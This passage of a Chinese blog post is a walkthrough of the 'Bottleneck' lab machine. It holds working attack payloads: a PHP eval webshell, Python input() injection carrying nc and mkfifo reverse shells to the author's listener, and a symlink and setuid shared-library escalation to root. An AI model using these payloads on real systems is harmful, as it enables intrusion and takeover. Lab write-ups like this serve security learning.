+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/log/soc/'</span><span class="token operator">.</span><span class="token variable">$logfile</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$imagefile</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'python /opt/ids_strong_bvb.py &lt;/var/log/soc/'</span><span class="token operator">.</span><span class="token variable">$logfile</span><span class="token operator">.</span><span class="token string single-quoted-string">' >/tmp/output 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">print_troll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结合黑名单来看，我们发现<code>/tmp</code>目录没有在黑名单中，因此我们可以利用文件包含漏洞读取<code>/tmp/output</code>文件的内容<br>构造payload.txt内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc
+&#x2F;tmp&#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>我们首先用<code>/etc</code>触发waf规则，然后在读取<code>/tmp/output</code>,获取到的output文件内容为</p>
+<img src="/2023/09/06/Bottleneck/16.png" class="">
+<p>尝试将shell写入<code>/tmp/output</code>,构造payload.txt内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;&lt;?php @eval($_GET[&#39;test&#39;]);?&gt;
+&#x2F;tmp&#x2F;output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>获得的&#x2F;tmp&#x2F;output文件内容为</p>
+<img src="/2023/09/06/Bottleneck/17.png" class="">
+<p>尽管将shell写入到了&#x2F;tmp&#x2F;output文件中，但怎么利用&#x2F;tmp&#x2F;output反弹shell暂时没想出啥好办法，但我们从&#x2F;tmp&#x2F;output中看到了python input()函数报错，因此想到会不会存在python2的input()漏洞。<br>首先我们的机器开启本地监听</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/18.png" class="">
+<p>重新构造payload，payload.txt内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc and __import__(&#39;os&#39;).system(&#39;nc 192.168.124.27 1234 -e &#x2F;bin&#x2F;sh&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>但未能获得shell，报错信息为</p>
+<img src="/2023/09/06/Bottleneck/19.png" class="">
+<p>看来单引号没有闭合，再次构造payload.txt内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;nc 192.168.124.27 1234 -e &#x2F;bin&#x2F;sh&#39;) and &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>同样也未能获取到shell,查看&#x2F;tmp&#x2F;output</p>
+<img src="/2023/09/06/Bottleneck/20.png" class="">
+<p>将<code>-e</code>换成<code>-c</code>同样不行，看来我们需要重新构造payload。<br>payload.txt为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#39; and __import__(&#39;os&#39;).system(&#39;rm -f &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.124.27 1234 &gt; &#x2F;tmp&#x2F;f&#39;) and &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>当该payload执行后，成功返回shell</p>
+<img src="/2023/09/06/Bottleneck/21.png" class="">
+<p>查看当前shell的权限</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/22.png" class="">
+<p>可以看到当前的权限为低权限，没权限访问root目录，下面就需要我们进行提权。<br>将提权检查脚本上传到靶机后执行</p>
+<img src="/2023/09/06/Bottleneck/23.png" class="">
+<p>根据提示，查看<code>/var/www/html/web_utils/clear_logs</code>该文件的属性</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/24.png" class="">
+<p>可以看到clear_logs是个软链接，它指向的是&#x2F;opt&#x2F;clear_logs.sh<br>查看&#x2F;opt&#x2F;clear_logs.sh文件属性</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /opt/clear_logs.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/25.png" class="">
+<p>可以看到&#x2F;opt&#x2F;clear_logs.sh属主为bytevsbyte用户，具有rwx权限。<br>我们首先需要切换到bytevsbyte用户，该怎么做呢？<br>由于<code>/var/www/html/web_utils/clear_logs</code>该文件可以被当前用户<code>www-data</code>以<code>bytevsbyte</code>的权限执行，这就是一个由<code>www-data</code>切换至<code>bytevsbyte</code>的契机<br>在我们本地创建一个<code>change</code>文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>将<code>change</code>文件上传至靶机</p>
+<img src="/2023/09/06/Bottleneck/26.png" class="">
+<p>赋予<code>change</code>文件可执行权限</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>修改<code>/var/www/html/web_utils/clear_logs</code>文件的链接指向<code>change</code>文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-snf</span> /var/www/html/web_utils/change /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/27.png" class="">
+<p>以<code>bytevsbyte</code>用户身份执行<code>/var/www/html/web_utils/clear_logs</code>文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> bytevsbyte /var/www/html/web_utils/clear_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>成功切换到<code>bytevsbyte</code>用户</p>
+<img src="/2023/09/06/Bottleneck/28.png" class="">
+<p>我们之前猜测<code>/opt/clear_logs.sh</code>是由某个计划任务调用的，而假如这个计划任务是以root权限执行的，那我们就可以因此获得root权限<br>查看bytevsbyte用户的计划任务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/29.png" class="">
+<p>很可惜，<code>/opt/clear_logs.sh</code>对应的计划任务是以<code>bytevsbyte</code>用户权限执行的，并非是以root用户权限，我们想利用计划任务提升至root权限的想法失败了，我们又该怎么办呢？<br>因为当前在<code>bytevsbyte</code>用户下，重新查找suid可执行文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/30.png" class="">
+<p>我们发现<code>/usr/test/testlib</code>文件具有suid权限<br>查看<code>/usr/test/testlib</code>文件属性</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-l</span> /usr/test/testlib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/31.png" class="">
+<p>可以看到<code>/usr/test/testlib</code>文件的属主是<code>root</code>,属组是<code>tester</code>，<code>tester</code>组对<code>/usr/test/testlib</code>具有可执行权限,而<code>bytevsbyte</code>用户属于<code>tester</code>组，意味着<code>bytevsbyte</code>用户对<code>/usr/test/testlib</code>具有可执行权限，又因为<code>/usr/test/testlib</code>具有suid权限，当<code>bytevsbyte</code>用户执行<code>/usr/test/testlib</code>可执行文件时就会在文件的执行过程中临时获得文件属主<code>root</code>权限。<br>在<code>/usr/test</code>下不仅存在testlib可执行文件，还存在它的源代码</p>
+<img src="/2023/09/06/Bottleneck/32.png" class="">
+<p>查看<code>testlib.c</code></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>				#argc表示命令行总的参数个数，argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>表示程序本身，argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>表示除程序本身的第一个参数，在这里即动态链接库
+    <span class="token keyword">void</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>function<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span>								#表示除程序本身外没有参数的话该函数就会退出，返回<span class="token number">1</span>
+        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>		#表示以懒加载的方式打开动态链接库
+    function <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token string">"test_this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		#表示在打开的动态链接库中查找test_this函数
+    <span class="token function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>									#表示执行test_this函数
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过阅读testlib.c的源码，我们知道如果要执行testlib可执行文件，就首先需要给它提供一个动态链接库文件，该动态链接库文件中还需要包含<code>test_this</code>函数<br>而我们的目的是通过执行<code>testlib</code>来获得root shell,因此我们需要一个可以获得root shell的动态链接库文件，在网上找到的可以实现该功能的链接库源码如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>修改该源代码中的main函数为test_this函数</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">void</span> <span class="token function">test_this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将该动态链接库源码编译为so文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> shell.c <span class="token parameter variable">-o</span> shell.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/33.png" class="">
+<p>编译报错，通过报错信息看出在源码中使用system函数要先声明，因此我们需要在源码中添加system函数的头文件,使用<code>man system</code>查看system函数的头文件</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">void</span> <span class="token function">test_this</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>重新编译，即可获得shell.so文件。<br>将shell.so文件上传至靶机，然后以<code>bytevsbyte</code>用户身份执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/test/testlib /tmp/shell.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/34.png" class="">
+<p>成功提权到root，查看&#x2F;root下的flag</p>
+<img src="/2023/09/06/Bottleneck/35.png" class="">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </div>
+      <div class="post-tags-categories">
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>txjg</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2023/09/06/Bottleneck/" target="_blank" title="Bottleneck">https://ntexjg.github.io/2023/09/06/Bottleneck/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+    
+
+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '#ffffff';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2022</p>
+
+          </div>
+        
+      
+        
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="netease"
+  type="playlist"
+  id="489221140"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <!-- 背景彩带 -->
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4, h5, h6',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 100) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('toc-aside')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  }
+</style> 
+
+<!-- 设置导航背景 -->
